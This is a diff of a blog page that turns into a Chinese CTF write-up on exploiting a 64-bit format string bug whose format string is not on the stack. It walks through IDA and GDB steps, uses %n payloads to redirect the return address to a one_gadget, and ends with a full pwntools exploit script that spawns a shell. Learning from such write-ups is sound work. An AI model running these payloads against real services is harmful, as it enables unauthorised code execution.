@@ -6,15 +6,47 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Category: PWN-notes | ZhouYetao</title>
+  <title>fmt_x64——格式化字符串不在栈上 | ZhouYetao</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="ZhouYetao">
-<meta property="og:url" content="http://example.com/categories/PWN-notes/index.html">
+  <meta name="description" content="对于32位的elf来说，pwntools有现成的函数fmt_str可以使用，但是对于64位的elf，就需要自己手动构建。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fmt_x64——格式化字符串不在栈上">
+<meta property="og:url" content="http://example.com/2021/09/16/fmt-x64%E2%80%94%E2%80%94%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8D%E5%9C%A8%E6%A0%88%E4%B8%8A/index.html">
 <meta property="og:site_name" content="ZhouYetao">
+<meta property="og:description" content="对于32位的elf来说，pwntools有现成的函数fmt_str可以使用，但是对于64位的elf，就需要自己手动构建。">
 <meta property="og:locale">
+<meta property="og:image" content="http://example.com/images/pasted-16.png">
+<meta property="og:image" content="http://example.com/images/pasted-17.png">
+<meta property="og:image" content="http://example.com/images/pasted-18.png">
+<meta property="og:image" content="http://example.com/images/pasted-19.png">
+<meta property="og:image" content="http://example.com/images/pasted-20.png">
+<meta property="og:image" content="http://example.com/images/pasted-21.png">
+<meta property="og:image" content="http://example.com/images/pasted-22.png">
+<meta property="og:image" content="http://example.com/images/pasted-23.png">
+<meta property="og:image" content="http://example.com/images/pasted-24.png">
+<meta property="og:image" content="http://example.com/images/pasted-25.png">
+<meta property="og:image" content="http://example.com/images/pasted-26.png">
+<meta property="og:image" content="http://example.com/images/pasted-27.png">
+<meta property="og:image" content="http://example.com/images/pasted-28.png">
+<meta property="og:image" content="http://example.com/images/pasted-30.png">
+<meta property="og:image" content="http://example.com/images/pasted-31.png">
+<meta property="og:image" content="http://example.com/images/pasted-32.png">
+<meta property="og:image" content="http://example.com/images/pasted-33.png">
+<meta property="og:image" content="http://example.com/images/pasted-34.png">
+<meta property="og:image" content="http://example.com/images/pasted-35.png">
+<meta property="og:image" content="http://example.com/images/pasted-36.png">
+<meta property="og:image" content="http://example.com/images/pasted-37.png">
+<meta property="og:image" content="http://example.com/images/pasted-38.png">
+<meta property="og:image" content="http://example.com/images/pasted-39.png">
+<meta property="og:image" content="http://example.com/images/pasted-40.png">
+<meta property="og:image" content="http://example.com/images/pasted-41.png">
+<meta property="article:published_time" content="2021-09-16T05:13:00.000Z">
+<meta property="article:modified_time" content="2021-09-16T07:39:09.118Z">
 <meta property="article:author" content="ZhouYetao">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="fmt">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/pasted-16.png">
   
     <link rel="alternative" href="/atom.xml" title="ZhouYetao" type="application/atom+xml">
   
@@ -151,36 +183,162 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-fmt-x64——格式化字符串不在栈上" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/09/13/ret2-libc-csu-init/" class="archive-article-date">
-  	<time datetime="2021-09-13T14:56:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-13</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/09/13/ret2-libc-csu-init/">ret2__libc_csu_init</a>
+    <h1 class="article-title" itemprop="name">
+      fmt_x64——格式化字符串不在栈上
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2021/09/16/fmt-x64%E2%80%94%E2%80%94%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8D%E5%9C%A8%E6%A0%88%E4%B8%8A/" class="archive-article-date">
+  	<time datetime="2021-09-16T05:13:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>对于32位的elf来说，pwntools有现成的函数fmt_str可以使用，但是对于64位的elf，就需要自己手动构建。</p>
+<span id="more"></span>
+
+<h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>通过对main函数的逆向，可以很直接地找到fmt地洞：</p>
+<p><img src="/images/pasted-16.png" alt="upload successful"></p>
+<p>然后查看程序地保护机制：</p>
+<p><img src="/images/pasted-17.png" alt="upload successful"></p>
+<p>发现程序开启了pie，所以在gdb动态调试的时候，会稍微麻烦一点。<br>开启gdb动态调试之前，先要找到函数下断点的地方，在IDA中鼠标光标选中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(format);</span><br></pre></td></tr></table></figure>
+<p>注意不是双击哦！然后按tab，之后会出现graph界面：</p>
+<p><img src="/images/pasted-18.png" alt="upload successful"></p>
+<p>然后按空格，即可跳转至以下界面：</p>
+<p><img src="/images/pasted-19.png" alt="upload successful"></p>
+<p>左边红框中地即为函数地偏移，先记下。</p>
+<h4 id="GDB动态调试"><a href="#GDB动态调试" class="headerlink" title="GDB动态调试"></a>GDB动态调试</h4><p>打开gdb，进行动态调试：</p>
+<p><img src="/images/pasted-20.png" alt="upload successful"></p>
+<p>先让程序跑起来，但是注意到这里先不要输入，直接ctrl+c打断程序运行：</p>
+<p><img src="/images/pasted-21.png" alt="upload successful"></p>
+<p>然后输入n，这时候程序会让你输入，这个时候输入一串字符，回车。</p>
+<p><img src="/images/pasted-22.png" alt="upload successful"></p>
+<p>发现了偏移为0x883的函数，直接n单步调试至改函数：</p>
+<p><img src="/images/pasted-23.png" alt="upload successful"></p>
+<p>输入命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack 30</span><br></pre></td></tr></table></figure>
+<p>查看栈中的值：</p>
+<p><img src="/images/pasted-24.png" alt="upload successful"></p>
+<p>发现可以通过格式化字符串获取到__libc_start_main的值，使用fmtarg获取格式化字符串的位置：</p>
+<p><img src="/images/pasted-25.png" alt="upload successful"></p>
+<p>继续观察stack中的值，发现了一条ebp链：</p>
+<p><img src="/images/pasted-26.png" alt="upload successful"></p>
+<p>使用fmtarg查找出这两处的偏移：</p>
+<p><img src="/images/pasted-27.png" alt="upload successful"></p>
+<p>由于程序开启了Full RELRO保护，所以不能修改got表的值，这边选择使用one_gadget去完成getshell。</p>
+<h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><h5 id="泄露libc基址"><a href="#泄露libc基址" class="headerlink" title="泄露libc基址"></a>泄露libc基址</h5><p>首先通过泄露__libc_start_main函数的地址获取libc的基址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base = __libc_start_main - libc.sym[&quot;__libc_start_main&quot;]</span><br></pre></td></tr></table></figure>
+<p>但是要注意，泄露出来的地址还得减去240：</p>
+<p><img src="/images/pasted-28.png" alt="upload successful"></p>
+<h5 id="泄露return地址"><a href="#泄露return地址" class="headerlink" title="泄露return地址"></a>泄露return地址</h5><p>泄露了libc的基址之后，进一步就是泄露出函数的return地址，这边可以先要确定函数return地址的偏移：</p>
+<p><img src="/images/pasted-30.png" alt="upload successful"></p>
+<p>通过计算这两个地址的差值可得到偏移：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">offset = 0x7fffffffdd98 - 0x7fffffffdcb8 = 224 = 0xe0</span><br></pre></td></tr></table></figure>
+<h5 id="获取one-gadget"><a href="#获取one-gadget" class="headerlink" title="获取one_gadget"></a>获取one_gadget</h5><p><img src="/images/pasted-31.png" alt="upload successful"></p>
+<h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>总体来说，攻击需要将return地址改成onegadget的地址。<br>这边把地址拆成了两份，因为每个地址只有后面的八位不同，所以以四位为一份。</p>
+<h5 id="第一步将ebp链指向return地址"><a href="#第一步将ebp链指向return地址" class="headerlink" title="第一步将ebp链指向return地址"></a>第一步将ebp链指向return地址</h5><p><img src="/images/pasted-32.png" alt="upload successful"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;%&quot; + str(low_retn) + &quot;c%9$hnstep1&quot;</span><br></pre></td></tr></table></figure>
+<p>动态结果：<br>首先vmmap查看函数起始地址</p>
+<p><img src="/images/pasted-33.png" alt="upload successful"></p>
+<p>然后加上0x883的偏移，下断点：</p>
+<p><img src="/images/pasted-34.png" alt="upload successful"></p>
+<p>输入c继续运行至断点处：</p>
+<p><img src="/images/pasted-35.png" alt="upload successful"></p>
+<p>发现已经修改成功。</p>
+<h5 id="第二步将onegadget的第一部分写入"><a href="#第二步将onegadget的第一部分写入" class="headerlink" title="第二步将onegadget的第一部分写入"></a>第二步将onegadget的第一部分写入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;%&quot; + str(low_onegadget) + &quot;c%35$hnstep2&quot;</span><br></pre></td></tr></table></figure>
+<p>动态结果：</p>
+<p><img src="/images/pasted-36.png" alt="upload successful"></p>
+<p>已经修改成功。这一步的修改是为了将返回地址指向one_gadget</p>
+<h5 id="第三步将更改one-gadget的第二部分写入"><a href="#第三步将更改one-gadget的第二部分写入" class="headerlink" title="第三步将更改one_gadget的第二部分写入"></a>第三步将更改one_gadget的第二部分写入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hign_retn = (retn_addr + 2)&amp;0xffff</span><br><span class="line">payload = &quot;%&quot; + str(hign_retn) + &quot;c%9$hnstep3&quot;</span><br></pre></td></tr></table></figure>
+<p>这一步需要重点讲解以下，根据stack中的显示，很容易将其理解为是0x7ffd6388f448这个地址指向了0x7f71c98ad226这个值，但是其实不然，</p>
+<p><img src="/images/pasted-37.png" alt="upload successful"></p>
+<p>其实0x7ffd6388f448这个地址是指向0x26这个值（linux中数据存储为小端序，这里不展开讲）。更直观可以使用命令x/b 0x7ffd6388f448查看0x7ffd6388f448指向的单个字节（由于重新运行了程序，地址不一样，但是本质是一样的）：</p>
+<p><img src="/images/pasted-38.png" alt="upload successful"></p>
+<p>如果理解了这一点，也就一定可以理解为什么payload中要讲return的地址加二，目的是为了指向低字节，修改one_gadget的低字节：</p>
+<p><img src="/images/pasted-39.png" alt="upload successful"></p>
+<h5 id="第四步调用one-gadget完成getshell"><a href="#第四步调用one-gadget完成getshell" class="headerlink" title="第四步调用one_gadget完成getshell"></a>第四步调用one_gadget完成getshell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;%&quot; + str(hign_onegadget) + &quot;c%35$hnstep4&quot;</span><br></pre></td></tr></table></figure>
+<p>动态结果：</p>
+<p><img src="/images/pasted-40.png" alt="upload successful"></p>
+<p>修改成功。<br>最后输入61happy跳出循环，到达return地址，完成getshell：</p>
+<p><img src="/images/pasted-41.png" alt="upload successful"></p>
+<p>最后附上完整脚本，完整脚本稍作调整：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"># context.log_level = &quot;debug&quot;</span><br><span class="line">p = process([&#x27;./test&#x27;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so&quot;&#125;)</span><br><span class="line"># p = remote(&quot;81.68.86.115&quot;, 10001)</span><br><span class="line">libc = ELF(&quot;./libc.so&quot;)</span><br><span class="line"># libc = ELF(&quot;./libc-2.31.so&quot;)</span><br><span class="line"></span><br><span class="line"># leak stack_addr and __libc_start_main ---&gt; leak libcbase</span><br><span class="line">payload = &quot;%7$p#%9$p@&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">__libc_start_main = int(p.recvuntil(&quot;#&quot;,True),16) - 240 </span><br><span class="line">retn_addr = int(p.recvuntil(&quot;@&quot;,True),16)- 0xe0</span><br><span class="line">log.success(&quot;__libc_start_main:0x%x&quot;,__libc_start_main)</span><br><span class="line">log.success(&quot;retn_addr:0x%x&quot;,retn_addr)</span><br><span class="line"></span><br><span class="line">one_gadget = [0xe6e73,0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">libcbase = __libc_start_main - libc.symbols[&#x27;__libc_start_main&#x27;]</span><br><span class="line">onegadget = libcbase + one_gadget[1]</span><br><span class="line">log.success(&quot;libcbase:0x%x&quot;,libcbase)</span><br><span class="line">log.success(&quot;onegadget:0x%x&quot;,onegadget)</span><br><span class="line"></span><br><span class="line"># change retn_addr</span><br><span class="line">hign_onegadget = (onegadget &gt;&gt; 16)&amp;0xffff</span><br><span class="line">low_onegadget = onegadget&amp;0xffff</span><br><span class="line">low_retn = retn_addr&amp;0xffff</span><br><span class="line">hign_retn = (retn_addr + 2)&amp;0xffff</span><br><span class="line">log.success(&quot;hign_onegadget:0x%x&quot;,hign_onegadget)</span><br><span class="line">log.success(&quot;low_onegadget:0x%x&quot;,low_onegadget)</span><br><span class="line">log.success(&quot;hign_retn:0x%x&quot;,hign_retn)</span><br><span class="line">log.success(&quot;low_retn:0x%x&quot;,low_retn)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"># pause()</span><br><span class="line">payload = &quot;%&quot; + str(low_retn) + &quot;c%9$hnstep1&quot;</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line">payload = &quot;%&quot; + str(low_onegadget) + &quot;c%35$hnstep2&quot;</span><br><span class="line">p.sendlineafter(&quot;step1&quot;,payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line">payload = &quot;%&quot; + str(hign_retn) + &quot;c%9$hnstep3&quot;</span><br><span class="line">p.sendlineafter(&quot;step2&quot;,payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line">payload = &quot;%&quot; + str(hign_onegadget) + &quot;c%35$hnstep4&quot;</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.sendlineafter(&quot;step3&quot;,payload)</span><br><span class="line"></span><br><span class="line">p.sendafter(&quot;step4&quot;,&quot;61happy\x00&quot;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -190,36 +348,123 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">stackoverflow</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">fmt</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/PWN-notes//" class="article-tag-list-link color5">PWN-notes</a>
+        			<a href="/categories/pwn-note//" class="article-tag-list-link color4">pwn-note</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/09/16/fmt-x64%E2%80%94%E2%80%94%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8D%E5%9C%A8%E6%A0%88%E4%B8%8A/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2021/09/13/ret2-libc-csu-init/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ret2__libc_csu_init</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -242,10 +487,10 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
-		isCategory: true,
+		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: true,
 		root: "/",
